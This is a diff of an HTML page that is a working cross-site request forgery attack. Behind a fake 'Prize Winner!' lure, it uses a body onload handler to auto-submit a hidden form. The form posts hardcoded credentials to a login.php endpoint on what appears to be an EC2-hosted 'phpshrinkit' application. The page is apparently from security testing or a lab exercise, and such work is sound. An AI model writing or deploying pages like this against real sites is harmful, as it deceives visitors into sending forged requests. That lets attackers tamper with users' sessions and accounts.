@@ -1,18 +1,17 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h1>You've won a prize! Click to claim.</h1>
+<head>
+    <title>Prize Winner!</title>
+</head>
+<body onload="document.getElementById('csrf-form').submit()">
+    <h1>Redirecting to your prize...</h1>
+
     <form id="csrf-form" action="http://ec2-3-107-205-120.ap-southeast-2.compute.amazonaws.com/phpshrinkit/login.php" method="POST">
-      <input type="hidden" name="user" value="user1" />
-      <input type="hidden" name="pwd" value="password1" />
-      <input type="hidden" name="step" value="login" />
-      <input type="hidden" name="submit" value="Submit" />
+        <input type="hidden" name="user" value="user1" />
+        <input type="hidden" name="pwd" value="password1" />
+
+        <input type="hidden" name="step" value="login" />
+        <input type="hidden" name="submit" value="Submit" />
     </form>
-
-    <script>
-      // This script automatically submits the form as soon as the page loads
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
+</body>
 </html>
-
-
